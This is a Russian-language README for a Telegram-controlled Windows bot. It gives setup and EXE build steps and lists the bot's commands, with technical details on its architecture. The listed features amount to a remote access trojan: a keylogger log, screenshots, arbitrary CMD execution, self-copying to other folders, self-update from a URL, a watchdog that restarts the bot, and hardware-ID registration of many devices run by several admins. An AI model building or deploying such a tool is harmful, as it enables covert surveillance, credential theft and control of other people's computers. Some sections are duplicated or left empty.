## 🚀 Быстрый старт

### ⚡ Вариант 1: Запуск через Python (для тестирования)

#### 1. Установите зависимости

```cmd
python -m pip install -r requirements.txt
```

#### 2. Настройте конфигурацию

**Создайте файл `.env`** в корневой папке проекта:

```env
BOT_TOKEN=ваш_токен_telegram_бота
SUPER_ADMIN_ID=ваш_id_в_telegram
```

**Где взять:**
- `BOT_TOKEN`: Получите от [@BotFather](https://t.me/BotFather) в Telegram
- `SUPER_ADMIN_ID`: Узнайте от [@userinfobot](https://t.me/userinfobot) в Telegram

#### 3. Запустите бота

```cmd
python main_bot.py
```

Или с Watchdog (для автоматического перезапуска):
```cmd
python watchdog.py
```

---

### 📦 Вариант 2: Компиляция в EXE

#### 1. Установите PyInstaller

```cmd
python -m pip install pyinstaller
```

#### 2. Скомпилируйте проект

Используйте готовый скрипт:
```cmd
build.bat
```

Или вручную:
```cmd
pyinstaller --clean main_bot.spec
pyinstaller --clean watchdog.spec
```

#### 3. Запустите из dist/

```cmd
cd dist
MainBot.exe
```

Или с Watchdog:
```cmd
Watchdog.exe
```

**Подробная инструкция**: См. [INSTALL.md](INSTALL.md)

### 3. Добавление администраторов

SuperAdmin может добавлять других администраторов через команду:
```
/add_admin [Telegram ID]
```

### 4. Регистрация устройств

При первом запуске бот на устройстве автоматически регистрируется.
Также можно вручную через команду:
```
/register_pc
```

### 5. Запуск системы

```cmd
python watchdog.py
```

Watchdog автоматически запустит `main_bot.py` и будет мониторить его состояние.

### 4. Компиляция в EXE (опционально)

```cmd

```

Или вручную:


## 📱 Команды управления

### Основные команды
- `/start` - Старт и справка
- `/info` - Статус устройства
- `/panel` - Главная панель с выбором устройства
- `/stop` - Остановка бота

### Управление устройством
- `/lock` - Блокировка экрана
- `/unlock` - Разблокировка
- `/screen` - Скриншот экрана
- `/keyboard` - Лог кейлоггера

### Системные команды
- `/procs` - Список процессов
- `/cs <cmd>` - Выполнить CMD команду
- `/recopy <путь>` - Копировать бота в указанную папку
- `/setname <имя>` - Сменить имя устройства
- `/update_url <url>` - Обновление через ZIP-архив

### Управление администраторами (только SuperAdmin)
- `/add_admin [ID]` - Добавить администратора
- `/del_admin [ID]` - Удалить администратора
- `/admin_list` - Список всех администраторов

### Управление устройствами
- `/pc_list` - Список всех зарегистрированных устройств
- `/register_pc` - Регистрация нового устройства
- `/wd_off` - Отключить watchdog на выбранном устройстве
- `/wd_on` - Включить watchdog на выбранном устройстве

## 🔧 Технические детали

### Двухкомпонентная архитектура

**Watchdog (watchdog.py)**:
- Постоянно проверяет наличие процесса main_bot.py
- При обнаружении отсутствия процесса запускает его заново
- Использует мьютекс для предотвращения множественных запусков
- Максимум 3 попытки перезапуска с задержкой 1 секунда

**Main Bot (main_bot.py)**:
- Основной функционал бота
- Обработка всех команд
- Использует мьютекс для проверки уникальности запуска

### Система мульти-администраторов

**Роли администраторов**:
- `super_admin` - полный доступ (только один, жестко задан в config.py)
- `admin` - стандартный доступ ко всем функциям
- `guest` - ограниченный доступ

**Управление сессиями**:
- Администратор выбирает устройство через `/panel`
- Все последующие команды отправляются на выбранное устройство
- Сессии хранятся в базе данных и в памяти

**HWID-идентификация**:
- Уникальный идентификатор генерируется на основе серийных номеров железа
- Не зависит от IP или MAC-адреса
- Позволяет точно идентифицировать устройства

### Механизм самообновления

1. Скачивает ZIP-архив по указанной ссылке
2. Распаковывает во временную папку
3. Генерирует `updater.bat` с задержкой 3 секунды
4. Запускает батник и завершает работу
5. Батник копирует новые файлы и запускает обновленную версию

### Обработка ошибок

- Все команды проверяют права доступа через `is_admin()`
- Ошибки логируются в файл bot_runtime.log
- В случае ошибки бот возвращает сообщение с описанием проблемы
- Основной цикл polling обернут в бесконечный цикл с задержкой 5 секунд при сбое

### Безопасное хранение файлов

- Все временные файлы сохраняются в `%TEMP%` через `tempfile.gettempdir()`
- Файлы удаляются после использования (в блоке `finally`)

## 🐛 Устранение неполадок

### Бот не запускается
1. Проверьте `BOT_TOKEN` и `SUPER_ADMIN_ID` в `config.py`
2. Убедитесь, что все зависимости установлены
3. Проверьте права доступа к файлам
4. Посмотрите логи в `bot_runtime.log`

### Watchdog не перезапускает бота
1. Убедитесь, что оба файла запущены
2. Проверьте, что `MUTEX_NAME` совпадает в обоих файлах
3. Проверьте логи в консоли

### Ошибки обновления
1. Проверьте URL файла обновления
2. Убедитесь в доступности файла
3. Проверьте права на запись в папку

### Администратор не может управлять устройством
1. Убедитесь, что администратор добавлен через `/add_admin`
2. Проверьте список администраторов через `/admin_list`
3. Выберите устройство через `/panel` перед управлением

### Устройство не отображается в списке
1. Запустите бота на устройстве
2. Выполните команду `/register_pc` от имени SuperAdmin
3. Проверьте список устройств через `/pc_list`
